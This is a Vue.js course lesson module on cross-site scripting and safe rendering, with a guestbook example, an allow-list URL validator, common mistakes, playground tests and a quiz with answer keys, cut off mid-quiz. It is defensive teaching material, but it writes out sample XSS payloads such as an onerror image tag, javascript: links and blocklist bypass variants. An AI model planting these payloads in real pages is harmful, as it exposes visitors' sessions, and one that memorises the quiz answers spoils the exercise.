// Lesson: XSS & safe rendering (Level 16 — Security & Production Readiness)

const guestbookApp = `<script setup>
import { ref } from 'vue'
import { safeUrl } from './safeUrl.js'

const comments = ref([
  { id: 1, author: 'Ada', message: 'Lovely guestbook!', website: 'https://example.com/ada' },
  { id: 2, author: 'Mallory', message: '<img src=x onerror=alert(1)>', website: 'javascript:alert(document.cookie)' },
])

const author = ref('')
const message = ref('')
const website = ref('')

function addComment() {
  if (!author.value.trim() || !message.value.trim()) return
  comments.value.push({
    id: Date.now(),
    author: author.value,
    message: message.value,
    website: website.value,
  })
  author.value = ''
  message.value = ''
  website.value = ''
}
</script>

<template>
  <h2>Guestbook ({{ comments.length }})</h2>

  <ul class="comments">
    <li v-for="c in comments" :key="c.id" class="comment">
      <a class="author" :href="safeUrl(c.website)">{{ c.author }}</a>
      <p class="body">{{ c.message }}</p>
    </li>
  </ul>

  <form class="new" @submit.prevent="addComment">
    <input v-model="author" class="in-author" placeholder="Your name" />
    <input v-model="website" class="in-website" placeholder="https://your.site" />
    <textarea v-model="message" class="in-message" placeholder="Say something (try some HTML!)"></textarea>
    <button>Post</button>
  </form>
</template>`

const safeUrlJs = `// Allow-list the link schemes we trust. Everything else becomes a harmless '#'.
const ALLOWED_PROTOCOLS = ['https:', 'http:']

export function safeUrl(input) {
  if (typeof input !== 'string' || input.trim() === '') return '#'
  try {
    // The browser's own URL parser: it lowercases the scheme and strips
    // the tabs/newlines/spaces that attackers use to sneak past string checks.
    const url = new URL(input.trim())
    return ALLOWED_PROTOCOLS.includes(url.protocol) ? url.href : '#'
  } catch {
    // Not an absolute URL (e.g. "my site") — refuse rather than guess.
    return '#'
  }
}`

const profileApp = `<script setup>
import { safeUrl } from './safeUrl.js'

const profiles = [
  { id: 1, name: 'Ada', website: 'https://example.com/ada' },
  { id: 2, name: 'Mallory', website: 'JaVaScRiPt:alert(1)' },
]
</script>

<template>
  <ul>
    <li v-for="p in profiles" :key="p.id" class="profile">
      {{ p.name }} — <a class="site" :href="safeUrl(p.website)">website</a>
    </li>
  </ul>
</template>`

const naiveSafeUrl = `// A blocklist: "refuse what looks bad, allow everything else".
export function safeUrl(input) {
  if (input.startsWith('javascript:')) return '#'
  return input
}`

const hardenedSafeUrl = `const ALLOWED_PROTOCOLS = ['https:', 'http:', 'mailto:']

export function safeUrl(input) {
  if (typeof input !== 'string') return '#'
  try {
    const url = new URL(input.trim())
    return ALLOWED_PROTOCOLS.includes(url.protocol) ? url.href : '#'
  } catch {
    return '#'
  }
}`

const bioApp = `<script setup>
import Bio from './Bio.vue'
</script>

<template>
  <Bio text="Hi, I build *Vue apps* and <script>steal()</script> nothing at all." />
</template>`

const bioStarter = `<script setup>
const props = defineProps({ text: { type: String, required: true } })

// "Quick" formatting: turn *word* into bold with a regex and v-html.
function toHtml(text) {
  return text.replace(/\\*(.+?)\\*/g, '<strong>$1</strong>')
}
</script>

<template>
  <p class="bio" v-html="toHtml(props.text)"></p>
</template>`

const bioSolution = `<script setup>
import { computed } from 'vue'
import { formatBio } from './format.js'

const props = defineProps({ text: { type: String, required: true } })
const segments = computed(() => formatBio(props.text))
</script>

<template>
  <p class="bio">
    <template v-for="(seg, i) in segments" :key="i">
      <strong v-if="seg.bold">{{ seg.text }}</strong>
      <span v-else>{{ seg.text }}</span>
    </template>
  </p>
</template>`

const formatStarter = `// Return an array of segments: { text: string, bold: boolean }
// "a *b* c" -> [{ text: 'a ', bold: false }, { text: 'b', bold: true }, { text: ' c', bold: false }]
export function formatBio(text) {
  return [{ text, bold: false }]
}`

const formatSolution = `export function formatBio(text) {
  // split() with a capture group keeps the captured parts:
  // even indexes are normal text, odd indexes were inside *stars*.
  return String(text)
    .split(/\\*([^*]+)\\*/)
    .map((part, i) => ({ text: part, bold: i % 2 === 1 }))
    .filter((seg) => seg.text !== '')
}`

export default {
  id: 'xss-safe-rendering',
  title: 'XSS & safe rendering',
  summary: 'Learn how attackers try to smuggle code into your pages, what Vue escapes for you automatically, and the handful of places where you must protect yourself.',
  difficulty: 'intermediate',
  minutes: 38,
  prerequisites: ['template-syntax', 'v-bind', 'v-html'],
  related: ['auth-security', 'secrets-csp-dependencies', 'render-functions', 'custom-directives', 'native-form-handling'],
  tags: ['security', 'xss', 'cross-site scripting', 'escaping', 'v-html', 'sanitization', 'javascript: url', 'href', 'user-generated content', 'dompurify'],
  apis: [
    { name: '{{ }} interpolation', summary: 'Renders a value as text. HTML inside the value is displayed, never parsed.' },
    { name: 'v-html', summary: 'Sets an element\'s innerHTML. Only for HTML you wrote yourself or have sanitized.' },
    { name: 'new URL()', summary: 'The browser\'s URL parser. Use `url.protocol` to allow-list link schemes.' },
  ],
  docs: [
    { label: 'Vue Guide — Security', url: 'https://vuejs.org/guide/best-practices/security.html' },
    { label: 'API — v-html', url: 'https://vuejs.org/api/built-in-directives.html#v-html' },
    { label: 'OWASP — XSS Prevention Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html' },
    { label: 'MDN — Cross-site scripting (XSS)', url: 'https://developer.mozilla.org/en-US/docs/Glossary/Cross-site_scripting' },
  ],

  intro: `
**XSS** (cross-site scripting) is what happens when an attacker manages to get *their* JavaScript running inside *your* page, in *someone else's* browser. Usually it sneaks in through content users can type: a comment, a profile bio, a product review, a chat message, even a search term in the URL.

Good news first: Vue's normal rendering — \`{{ interpolation }}\` and \`:attribute\` bindings — treats user content as **plain text**, so most XSS attempts simply show up on screen as harmless characters.

The rest of this lesson is about the few doors Vue cannot lock for you: \`v-html\`, raw \`innerHTML\`, **URLs** in \`:href\`/\`:src\`, user-controlled styles and attributes, and untrusted templates.
`,

  why: `
Once attacker code runs in your page, it runs *as your page*. It can:

- read anything the page can read — including tokens kept in \`localStorage\` (more in [authentication & token storage](lesson:auth-security));
- send requests to your API **as the logged-in user** (change their email, post spam, transfer money);
- redraw the page — for example a fake "session expired, log in again" form that sends the password to the attacker.

The scary version is **stored XSS**: one malicious comment saved in your database attacks *every* visitor who views it. That's why "how do you render user content?" is a real engineering decision, not a style choice.

\`\`\`vue
<!-- The same comment, two very different outcomes -->
<p>{{ comment.text }}</p>        <!-- shows the characters: safe -->
<p v-html="comment.text"></p>    <!-- the browser builds real elements: dangerous -->
\`\`\`
`,

  eli15: `
Imagine a school receptionist who reads notes out loud over the speakers.

A student slips in a note that says: **"Everyone go home now."**

A careful receptionist reads it *as words*: "Here's a note that says: Everyone go home now." Nobody leaves — it's just a funny announcement.

A careless receptionist *obeys* the note and rings the home-time bell. Chaos.

Vue's \`{{ }}\` is the careful receptionist: whatever text a user writes — even text that looks like HTML or code — is shown as characters. \`v-html\` is the careless one: it hands the text to the browser and says "build whatever this describes", including things that run code.

**Rule of thumb: show users' words, never obey them.**
`,

  analogy: {
    title: 'The receptionist and the notes',
    body: `
Every message that reaches your page is a note from a stranger. Most are fine; some are booby-trapped.

Reading notes aloud (escaping) is always safe. Following a note's instructions (parsing HTML, running URLs) is only safe if someone has checked the note against a short list of **approved instructions** first (sanitizing with an allow-list). And the building still has a **security guard** at the door in case something slips through (Content Security Policy, covered in [the next lessons](lesson:secrets-csp-dependencies)).
`,
    mapping: [
      ['a note from a stranger', 'user-generated content: comments, bios, URLs, query strings'],
      ['reading the note aloud', '`{{ }}` and `:attr` bindings — the value becomes text'],
      ['obeying the note', '`v-html`, `innerHTML`, `javascript:` links — the value becomes code'],
      ['the list of approved instructions', 'an allow-list sanitizer (e.g. DOMPurify, or only `https:` links)'],
      ['the security guard at the door', 'Content Security Policy — a second line of defense'],
    ],
  },

  visual: {
    type: 'directive-lab',
    props: { directive: 'interpolation' },
    title: 'Text stays text',
    caption: 'Type something that looks like HTML into the input and inspect the DOM: interpolation creates a **text node**, so tags appear as characters and nothing is parsed.',
    alt: 'An interactive lab: an input feeds a value into a {{ }} interpolation. The rendered output and the real DOM are shown side by side; HTML-looking input appears as literal characters inside a single text node.',
  },

  animation: {
    type: 'concept-diagram',
    title: 'Anatomy of a stored XSS attempt',
    caption: 'Follow one malicious comment from the attacker to a victim\'s screen, and see exactly where the rendering choice decides the outcome.',
    alt: 'A diagram with five boxes: Attacker, API and database, Vue app, then two branches — interpolation, which shows the comment as text, and v-html, which turns it into live HTML that can run code in the victim\'s browser.',
    props: {
      width: 760,
      height: 320,
      nodes: [
        { id: 'attacker', label: 'Attacker', note: 'posts a "comment"', tone: 'red', x: 80, y: 160 },
        { id: 'api', label: 'API + database', note: 'stores it as-is', tone: 'kraft', x: 250, y: 160 },
        { id: 'app', label: 'Your Vue app', note: 'fetches comments', tone: 'cobalt', x: 420, y: 160 },
        { id: 'interp', label: '{{ comment.text }}', note: 'text node — safe', tone: 'acid', x: 640, y: 80 },
        { id: 'vhtml', label: 'v-html="comment.text"', note: 'parsed as HTML — runs', tone: 'red', x: 640, y: 240 },
      ],
      edges: [
        { from: 'attacker', to: 'api', label: 'POST /comments' },
        { from: 'api', to: 'app', label: 'GET /comments' },
        { from: 'app', to: 'interp', label: 'safe path' },
        { from: 'app', to: 'vhtml', label: 'unsafe path', dashed: true },
      ],
      steps: [
        { focus: ['attacker'], text: 'The attacker submits a comment whose text is `<img src=x onerror=alert(1)>`. To your form it is just a string.' },
        { focus: ['api'], edges: ['attacker->api'], text: 'The backend saves it. If the backend neither validates nor sanitizes, the payload now sits in your database waiting for visitors — this is **stored XSS**.' },
        { focus: ['app'], edges: ['api->app'], text: 'Every visitor\'s browser downloads the comment. From here, *how you render it* decides everything.' },
        { focus: ['interp'], edges: ['app->interp'], text: 'With `{{ }}`, Vue puts the string into a **text node**. The visitor sees the characters `<img src=x …>`. No element is created, nothing runs.' },
        { focus: ['vhtml'], edges: ['app->vhtml'], text: 'With `v-html`, the browser **parses** the string and creates a real `<img>`. Its image fails to load, `onerror` fires, and the attacker\'s JavaScript runs with the visitor\'s session.' },
        { focus: ['api', 'interp'], text: 'Defense in depth: validate and sanitize on the **server** (it protects every client, not just yours), render as text in the **client**, and add a **CSP** as the safety net.' },
      ],
    },
  },

  syntax: [
    `
#### Safe by default

Vue escapes values in **text interpolation** and **attribute bindings**. "Escaping" means the value is treated as data: \`<\` stays the character \`<\` instead of starting a tag.
`,
    {
      code: `<script setup>
const review = '<img src=x onerror=alert(1)>'
const nickname = '" onmouseover="alert(1)'
</script>

<template>
  <p>{{ review }}</p>              <!-- shows the characters, creates no <img> -->
  <span :title="nickname">hover</span> <!-- the whole string is the title's value -->
</template>`,
      lang: 'vue',
      title: 'escaped automatically',
    },
    `
#### The doors you must lock yourself

1. **\`v-html\`** sets \`innerHTML\`. Never feed it unsanitized user content (see [v-html and its security implications](lesson:v-html)).
2. **URLs** in \`:href\`, \`:src\`, \`:action\`, \`:formaction\`. Escaping doesn't help: \`javascript:alert(1)\` is a perfectly valid attribute value. **Allow-list** the schemes you accept.
3. **Styles**: binding a whole user-provided style string lets attackers position invisible overlays over your buttons (clickjacking). Bind only specific, validated properties: \`:style="{ color: chosenColor }"\`.
4. **Spreading attributes**: \`v-bind="userObject"\` lets the user pick *which* attributes to set — including inline event-handler attributes like \`onclick\`. Never spread untrusted objects onto elements.
5. **Templates**: a Vue template is code. Never compile a user-provided string as a template (\`template: userString\`) — expressions inside it run as JavaScript.
6. **Bypassing Vue**: \`el.innerHTML = …\` in a template ref, custom directive or render function skips all of Vue's protection.
`,
    {
      code: `// Allow-list, don't block-list
const ALLOWED = ['https:', 'http:', 'mailto:']

export function safeUrl(input) {
  try {
    const url = new URL(input)          // the browser's own parser
    return ALLOWED.includes(url.protocol) ? url.href : '#'
  } catch {
    return '#'                          // not a valid absolute URL
  }
}`,
      lang: 'js',
      title: 'safeUrl.js — validating a user URL',
    },
    `
#### When you genuinely need user HTML

For rich text (a blog editor, Markdown comments) pass the HTML through a well-maintained **sanitizer** with an allow-list of tags and attributes before \`v-html\` — ideally on the server *and* the client. [DOMPurify](https://github.com/cure53/DOMPurify) is a widely used choice (a third-party library, shown as static code):
`,
    {
      code: `import DOMPurify from 'dompurify'
import { computed } from 'vue'

const safeHtml = computed(() => DOMPurify.sanitize(post.value.html))
// <div v-html="safeHtml"></div>`,
      lang: 'js',
      title: 'sanitizing before v-html (static example)',
      static: true,
    },
    {
      callout: 'note',
      title: 'Frontend checks are a second layer',
      text: 'Client-side sanitizing protects *your* UI only. Other clients (a mobile app, an email digest, an admin tool) read the same data, so the backend must validate and sanitize too. Vue\'s own Security guide recommends sanitizing user-provided URLs on the backend before they are even saved.',
    },
  ],

  walkthrough: {
    title: 'App.vue',
    lang: 'vue',
    code: guestbookApp,
    intro: 'A guestbook that accepts names, messages and websites from strangers — and stays safe. Step through the decisions that make it safe.',
    steps: [
      { lines: [3], text: '`safeUrl` lives in its own module so every link in the app goes through the same, tested rule.' },
      { lines: [5, 8], text: 'Mallory\'s comment is a classic attack: an `<img>` whose `onerror` runs code, and a `javascript:` "website". We render them anyway — the rendering choices below neutralise both.' },
      { lines: [14, 26], text: 'Adding a comment just stores the strings. Notice there is **no** "strip the tags" logic here — we don\'t need it, because we never render these strings as HTML.' },
      { lines: [33], text: '`:href="safeUrl(c.website)"` — escaping can\'t stop a `javascript:` URL, so the URL is validated against an allow-list. Mallory\'s link becomes `#`.' },
      { lines: [34], text: '`{{ c.message }}` creates a text node. Mallory\'s `<img …>` is shown as characters; the browser never builds an image element.' },
      { lines: [38, 43], text: '`@submit.prevent` keeps the page from reloading. Try posting your own HTML from the form and see it displayed as text.' },
    ],
  },

  playground: {
    title: 'A guestbook that strangers can\'t hijack',
    objective: 'Post comments containing HTML and sneaky links, then tighten the link rules and the way untrusted links are displayed.',
    files: { 'App.vue': guestbookApp, 'safeUrl.js': safeUrlJs },
    expected: 'Two comments. Mallory\'s message appears as the literal text `<img src=x onerror=alert(1)>` and her name links to `#` (hover it). Post a comment with `<b>hi</b>` as the message: you\'ll see the tags, not bold text.',
    experiments: [
      {
        id: 'post-html',
        task: 'Post a comment whose message is `<button>Free prize</button>`. Then open the **Elements** view of your browser devtools (or just look closely): is there a real button?',
        hint: 'Type it into the textarea and press Post.',
        explain: 'There is no button — only the characters. Interpolation writes a text node, so the browser never parses the string as HTML. This is why `{{ }}` is your default for anything a user typed.',
      },
      {
        id: 'mailto',
        task: 'Some visitors want to leave an email instead of a website. Change `safeUrl.js` so `mailto:` links are allowed too — while `javascript:` links stay blocked.',
        hint: 'Add `\'mailto:\'` to the `ALLOWED_PROTOCOLS` array.',
        tests: [
          {
            name: 'mailto: links are kept',
            code: `const { safeUrl } = requireModule('safeUrl.js')
expect(safeUrl('mailto:ada@example.com')).toBe('mailto:ada@example.com')`,
          },
          {
            name: 'javascript: links are still blocked',
            code: `const { safeUrl } = requireModule('safeUrl.js')
expect(safeUrl('javascript:alert(1)')).toBe('#')
expect(safeUrl('JAVASCRIPT:alert(1)')).toBe('#')`,
          },
        ],
        explain: 'An allow-list grows deliberately, one trusted scheme at a time. Anything you didn\'t think of — `javascript:`, `data:`, `vbscript:`, schemes invented next year — is refused by default.',
      },
      {
        id: 'rel',
        task: 'Links written by strangers deserve extra care. Make every author link open in a new tab (`target="_blank"`) and carry `rel="nofollow ugc noopener"`.',
        hint: 'Add both attributes to the `<a class="author">` element.',
        tests: [
          {
            name: 'author links have rel="nofollow ugc noopener" and target="_blank"',
            code: `const rel = attr('.comment a', 'rel') || ''
expect(rel).toContain('nofollow')
expect(rel).toContain('ugc')
expect(rel).toContain('noopener')
expect(attr('.comment a', 'target')).toBe('_blank')`,
          },
        ],
        explain: '`noopener` stops the opened page from controlling your tab through `window.opener` (modern browsers already imply it for `target="_blank"`, but being explicit costs nothing). `nofollow` and `ugc` tell search engines the link is user-generated, which removes the incentive for link spam.',
      },
      {
        id: 'no-dead-links',
        task: 'A link to `#` is confusing. When `safeUrl()` rejects a website, render the author\'s name as plain text in a `<span class="author">` instead of a link.',
        hint: 'Use `v-if="safeUrl(c.website) !== \'#\'"` on the `<a>` and a `<span v-else class="author">` next to it.',
        tests: [
          {
            name: 'Mallory\'s name is plain text, not a link',
            code: `const items = findAll('.comment')
expect(items.length).toBeGreaterThan(1)
expect(items[1].querySelector('a')).toBeNull()
expect(items[1].querySelector('.author').textContent.trim()).toBe('Mallory')`,
          },
          {
            name: 'Ada keeps her real link',
            code: `const items = findAll('.comment')
expect(items[0].querySelector('a.author').getAttribute('href')).toBe('https://example.com/ada')`,
          },
        ],
        explain: 'Security and UX work together: a rejected URL shouldn\'t look clickable. In a real app you would also reject it at the form (and on the server) so users get feedback when they type it.',
      },
    ],
  },

  internals: {
    beginner: `
The browser has two very different ways to put text on a page. It can **parse** a string as HTML (\`<b>\` becomes a bold element, \`<img onerror>\` becomes an image with an event handler), or it can create a **text node**, which is just characters with no meaning.

Vue's templates use text nodes for \`{{ }}\` and set attributes as plain values. \`v-html\` is the one directive that asks the browser to parse — which is why it carries a warning label.
`,
    technical: [
      `
Your template is compiled into a render function. \`{{ msg }}\` becomes a **text vnode** (or the text children of an element). When Vue mounts it, \`runtime-dom\` creates the node with \`document.createTextNode()\` and updates it by setting \`textContent\`/\`nodeValue\`. Those APIs never invoke the HTML parser, so no string can become markup.

Attribute bindings go through \`setAttribute()\` or a DOM property assignment. The value is stored as-is; it can't "break out" of the attribute the way it could when you glue HTML strings together by hand.

\`v-html\` compiles to setting the element's \`innerHTML\` property — the browser parses the string and builds whatever elements it describes. (Scripts inserted via \`innerHTML\` don't execute, but event-handler attributes such as \`onerror\` do, which is why "strip \`<script>\` tags" is not a defense.)
`,
      {
        code: `// What the compiled template does, simplified
const text = document.createTextNode(String(msg))   // {{ msg }}
el.setAttribute('title', nickname)                  // :title="nickname"
el.innerHTML = trustedHtml                          // v-html — parsed!`,
        lang: 'js',
        title: 'the DOM calls behind each syntax (simplified)',
      },
      `
**Why escaping can't save \`:href\`:** the danger isn't in the characters, it's in the *meaning*. \`javascript:alert(1)\` contains nothing to escape, but when a user clicks the link the browser runs the URL as script. Only *validating the URL* helps, and the robust way is to let \`new URL()\` parse it (it normalises letter case and strips the tabs, newlines and leading spaces attackers hide in) and compare \`url.protocol\` with an allow-list.

**On the server:** during server-side rendering Vue builds an HTML *string*, so it escapes interpolated values (\`&\`, \`<\`, \`>\`, \`"\`, \`'\`) itself. \`v-html\` content is inserted raw on the server as well. See [CSR, SSR & SSG](lesson:rendering-strategies).

**Templates are code:** template expressions are compiled to JavaScript. Compiling a user-supplied template (with the full build that includes the runtime compiler) is equivalent to running their code — Vue's Security guide calls this "Rule No.1".
`,
    ],
    production: `
- **Default to text.** Code review red flags: \`v-html\`, \`innerHTML\`, \`outerHTML\`, \`insertAdjacentHTML\`, \`document.write\`, \`v-bind="someObjectFromTheApi"\`, \`:href\`/\`:src\` fed by user data, \`:style\` fed a whole user string.
- **Rich text needs a pipeline:** Markdown → HTML → a maintained sanitizer with an allow-list → \`v-html\`. Prefer renderers that produce *structure* (tokens/vnodes) instead of HTML strings when you can.
- **Sanitize at the boundary that protects everyone.** The backend validates input and sanitizes stored HTML/URLs; the frontend sanitizes again where it renders HTML. Never rely on the frontend alone.
- **Add a Content Security Policy** so that if an injection slips through, inline scripts and unknown script sources are still blocked ([CSP lesson](lesson:secrets-csp-dependencies)).
- **Don't make XSS worse:** keep session tokens out of JavaScript-readable storage where you can (httpOnly cookies — see [token storage](lesson:auth-security)), so a successful injection can't simply copy them.
- Some teams add lint rules for the patterns above (eslint-plugin-vue has a \`vue/no-v-html\` rule) so every \`v-html\` gets a conscious review.
`,
  },

  mistakes: [
    {
      title: 'Rendering user content with v-html',
      wrong: { code: `<div class="review" v-html="review.body"></div>`, lang: 'vue' },
      right: { code: `<div class="review">{{ review.body }}</div>\n\n<!-- or, if rich text is a real requirement: -->\n<div class="review" v-html="sanitize(review.html)"></div>`, lang: 'vue' },
      explanation: '`v-html` hands the string to the HTML parser. If a user wrote it, they control which elements and event handlers exist on your page. Use interpolation; if you truly need formatting, sanitize with an allow-list first.',
    },
    {
      title: 'Block-listing bad URLs instead of allow-listing good ones',
      wrong: { code: `function safeUrl(u) {\n  return u.startsWith('javascript:') ? '#' : u\n}\n// bypassed by 'JavaScript:…', ' javascript:…', 'java\\tscript:…', 'data:…'`, lang: 'js' },
      right: { code: `function safeUrl(u) {\n  try {\n    const url = new URL(u)\n    return ['https:', 'http:', 'mailto:'].includes(url.protocol) ? url.href : '#'\n  } catch {\n    return '#'\n  }\n}`, lang: 'js' },
      explanation: 'Browsers are forgiving: they ignore letter case in schemes and strip tabs and newlines from URLs. A string check misses those variants; the browser\'s own parser sees exactly what the browser will see.',
    },
    {
      title: '"I removed the <script> tags, so it\'s safe"',
      wrong: { code: `const cleaned = input.replace(/<script.*?>.*?<\\/script>/gi, '')\nel.innerHTML = cleaned  // <img src=x onerror=…> walks straight through`, lang: 'js' },
      right: { code: `// Text? Use interpolation. HTML? Use a real sanitizer:\nconst cleaned = DOMPurify.sanitize(input)`, lang: 'js' },
      explanation: 'There are many ways to run JavaScript from HTML without a `<script>` tag (event-handler attributes, `javascript:` URLs, SVG tricks). Home-made regex sanitizers lose that race. Use a maintained, allow-list based sanitizer.',
    },
    {
      title: 'Bypassing Vue with innerHTML in a ref or directive',
      wrong: { code: `onMounted(() => {\n  preview.value.innerHTML = comment.value // skips Vue's escaping entirely\n})`, lang: 'js' },
      right: { code: `onMounted(() => {\n  preview.value.textContent = comment.value\n})\n// or just: <div ref="preview">{{ comment }}</div>`, lang: 'js' },
      explanation: 'Vue can only protect what Vue renders. Direct DOM access (template refs, custom directives, third-party widgets) must follow the same rule: `textContent` for text, a sanitizer for HTML.',
    },
    {
      title: 'Spreading an object from the API onto an element',
      wrong: { code: `<a v-bind="link.attrs">{{ link.label }}</a>\n<!-- attrs could be { href: 'javascript:…', onclick: '…' } -->`, lang: 'vue' },
      right: { code: `<a :href="safeUrl(link.url)" rel="nofollow ugc noopener">{{ link.label }}</a>`, lang: 'vue' },
      explanation: 'With `v-bind="obj"` the data decides which attributes exist. Bind the specific attributes you expect, each validated for its meaning.',
    },
  ],

  debugging: [
    {
      symptom: 'Comments show `&lt;b&gt;` or `&amp;amp;` instead of the characters users typed.',
      cause: 'Double escaping: the server already HTML-encoded the text before storing or sending it, and Vue escapes it again when rendering.',
      fix: 'Store and send the raw text; escape exactly once, at output time. In a Vue app, interpolation is that output step.',
    },
    {
      symptom: 'Users complain their `<b>bold</b>` formatting shows up as tags.',
      cause: 'That is interpolation working as designed — the content is treated as text.',
      fix: 'If formatting is a real requirement, offer Markdown or a rich-text editor and render through a sanitizer (or a renderer that outputs structure). Don\'t switch to raw `v-html`.',
    },
    {
      symptom: 'After adding a sanitizer, legitimate links and images in posts disappeared.',
      cause: 'The allow-list is stricter than your content needs (or the sanitizer removes URLs with schemes you didn\'t allow).',
      fix: 'Configure the allow-list deliberately — e.g. allow `a[href]` but only with `https:`/`mailto:` — and add tests with real sample posts.',
    },
    {
      symptom: 'A user\'s profile link does nothing when clicked, or points to `#`.',
      cause: 'Your URL validator rejected it — often because the user typed `example.com` without a scheme, which `new URL()` can\'t parse as absolute.',
      fix: 'Validate at the form with a helpful message (or normalise by adding `https://` before validating), and apply the same rule on the server.',
    },
    {
      symptom: 'The browser console shows a Content-Security-Policy violation for an inline script or handler you never wrote.',
      cause: 'Something injected markup — very often a `v-html` with unsanitized content. The CSP blocked it.',
      fix: 'Treat it as a real incident: find the injection point and render that data as text or sanitize it. CSP is the safety net, not the fix.',
    },
  ],

  bestPractices: [
    'Render anything a user (or another system) wrote with `{{ }}` or attribute bindings — that is the default, and it\'s safe.',
    'Treat every `v-html` as a security decision: only for HTML you authored or have sanitized with a maintained allow-list sanitizer.',
    'Validate URLs with `new URL()` and an allow-list of protocols before binding them to `href`, `src` or `action`.',
    'Bind specific style properties and specific attributes; never spread user-controlled objects with `v-bind="obj"`.',
    'Never compile user-supplied strings as Vue templates.',
    'Sanitize and validate on the backend too — it protects every client, not just your Vue app.',
    'Add a Content Security Policy as defense in depth, and review direct DOM access (`innerHTML`, third-party widgets) as carefully as templates.',
  ],

  useCases: [
    'Comment sections, reviews and chat messages: interpolation only.',
    'User profiles with a "website" field: `safeUrl()` + `rel="nofollow ugc noopener"`.',
    'A CMS or blog with rich text: Markdown/HTML → sanitizer (server and client) → `v-html`.',
    'Search pages that echo the query ("Results for …"): interpolation, never `v-html`.',
    'Admin tools that display data from many sources: assume every field could be hostile.',
  ],

  whenToUse: {
    use: [
      'Interpolation (`{{ }}`) for every piece of user-generated or third-party text.',
      '`v-html` only for content you control (your own translations, trusted CMS output that has been sanitized).',
      'An allow-list URL validator wherever data flows into `href`, `src`, `action` or `formaction`.',
    ],
    avoid: [
      '`v-html`, `innerHTML` or `insertAdjacentHTML` with anything a user could influence, unless it was sanitized.',
      'Hand-written regex "sanitizers" and blocklists — they are bypassed in ways you won\'t predict.',
      'Building HTML strings by concatenation (`\'<b>\' + name + \'</b>\'`) — build elements in the template instead.',
    ],
  },

  comparison: {
    title: 'Where user content can go, and how safe it is',
    headers: ['', 'Escaped by Vue?', 'Can run attacker JavaScript?', 'Use with user content?'],
    rows: [
      ['`{{ text }}`', 'yes — becomes a text node', 'no', '**yes** — the default'],
      ['`:title="text"`', 'yes — stored as the attribute value', 'no (for non-URL, non-event attributes)', 'yes'],
      ['`:href="url"` / `:src`', 'yes, but that doesn\'t help', '**yes** — `javascript:` URLs', 'only after an allow-list check'],
      ['`:style="userString"`', 'yes, but that doesn\'t help', 'no script, but enables clickjacking overlays', 'bind specific properties only'],
      ['`v-html="html"`', '**no** — parsed as HTML', '**yes**', 'only sanitized HTML'],
      ['`el.innerHTML = html`', '**no** — bypasses Vue', '**yes**', 'only sanitized HTML'],
    ],
    note: 'Escaping protects the *structure* of your HTML. Validation protects the *meaning* of URLs and attributes. You need both. Continue with [authentication & token storage](lesson:auth-security).',
  },

  quiz: [
    {
      id: 'xss-safe-rendering-q1',
      type: 'output',
      prompt: 'A user submits the comment `<b>Hi</b>`. What does a visitor see?',
      code: {
        lang: 'vue',
        code: `<script setup>
const comment = '<b>Hi</b>'
</script>

<template>
  <p>{{ comment }}</p>
</template>`,
      },
      options: [
        { text: 'The word **Hi** in bold', why: 'That would need the browser to parse the string as HTML. Interpolation never does.' },
        { text: 'The literal characters `<b>Hi</b>`' },
        { text: 'Nothing — Vue strips HTML tags', why: 'Vue doesn\'t remove anything; it displays the string exactly as text.' },
        { text: 'A console error about unsafe content', why: 'This is completely normal, safe usage — no error or warning.' },
      ],
      answer: 1,
      explanation: 'Interpolation creates a text node, so `<` and `>` are just characters. That is exactly why `{{ }}` is safe for user content.',
    },
    {
      id: 'xss-safe-rendering-q2',
      type: 'mcq',
      prompt: 'Which of these can let attacker-controlled data run JavaScript? (Select all that apply.)',
      options: [
        { text: '`<div v-html="post.body">` with unsanitized user HTML' },
        { text: '`<a :href="user.website">` where the website is user-provided' },
        { text: '`<p>{{ user.bio }}</p>`', why: 'Interpolation renders text nodes — the bio is displayed, never executed.' },
        { text: '`<button v-bind="attrsFromApi">` where the object comes from the API' },
        { text: '`<img :alt="photo.caption">`', why: '`alt` is a plain text attribute; the value is set as data and has no executable meaning.' },
      ],
      answer: [0, 1, 3],
      explanation: '`v-html` parses HTML; `href` can hold a `javascript:` URL; spreading an object lets the data choose attributes such as inline event handlers. Interpolation and plain text attributes are escaped and inert.',
    },
    {
      id: 'xss-safe-rendering-q3',
      type: 'bug',
      prompt: 'This product review card has an XSS hole. Click the line that causes it.',
      code: {
        lang: 'vue',
        code: `<script setup>
defineProps({ review: Object })
</script>

<template>
  <article class="review">
    <h3>{{ review.title }}</h3>
    <p class="stars">{{ '★'.repeat(review.stars) }}</p>
    <div class="body" v-html="review.body"></div>
    <small :title="review.date">{{ review.author }}</small>
  </article>
</template>`,
      },
      answerLine: 9,
      explanation: 'Line 9 parses the user-written review body as HTML. Every other line uses interpolation or a plain attribute binding, which Vue escapes. Fix: `<div class="body">{{ review.body }}</div>`, or sanitize if rich text is required.',
    },
    {
      id: 'xss-safe-rendering-q4',
      type: 'fill',
      prompt: 'Complete the allow-list URL check using the browser\'s URL parser.',
      code: {
        lang: 'js',
        code: `const ALLOWED = ['https:', 'http:', 'mailto:']

export function safeUrl(input) {
  try {
    const url = new ___(input)
    return ALLOWED.includes(url.___) ? url.href : '#'
  } catch {
    return '#'
  }
}`,
      },
      answer: [['URL'], ['protocol']],
      explanation: '`new URL()` parses the string exactly like the browser will, and `url.protocol` is the lowercased scheme including the colon (`"javascript:"`, `"https:"`).',
    },
    {
      id: 'xss-safe-rendering-q5',
      type: 'mcq',
      prompt: 'Your frontend now sanitizes all post HTML with a sanitizer library before `v-html`. What about the backend?',
      options: [
        { text: 'It no longer needs to care — the frontend sanitizes everything.', why: 'Attackers can call your API directly, and other clients (mobile apps, emails, admin tools) read the same data without your Vue code.' },
        { text: 'It should still validate and sanitize, because the frontend only protects its own rendering.' },
        { text: 'It should base64-encode the HTML so it can\'t be executed.', why: 'Encoding for storage changes nothing — once decoded and rendered with innerHTML it is just as dangerous.' },
        { text: 'It should reject any request that contains the `<` character.', why: 'That breaks legitimate content ("2 < 3", code snippets) and still misses `javascript:` URLs.' },
      ],
      answer: 1,
      explanation: 'Defense in depth: the server protects every consumer of the data; the client protects its own rendering. Neither replaces the other.',
    },
    {
      id: 'xss-safe-rendering-q6',
      type: 'output',
      prompt: 'With the naive filter below, which input **gets through** as a working `javascript:` link?',
      code: {
        lang: 'js',
        code: `function safeUrl(u) {
  return u.startsWith('javascript:') ? '#' : u
}`,
      },
      options: [
        { text: '`javascript:alert(1)`', why: 'This exact lowercase form is the one case the filter catches.' },
        { text: '`JavaScript:alert(1)`' },
